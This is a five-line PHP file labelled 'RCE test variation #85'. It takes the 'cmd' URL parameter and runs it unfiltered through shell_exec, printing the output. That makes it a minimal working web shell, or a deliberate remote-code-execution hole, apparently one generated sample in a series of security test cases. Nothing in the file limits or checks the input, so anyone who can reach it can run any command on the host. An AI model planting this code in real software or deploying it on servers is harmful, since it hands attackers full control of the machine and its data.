<?php
// RCE test variation #85
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>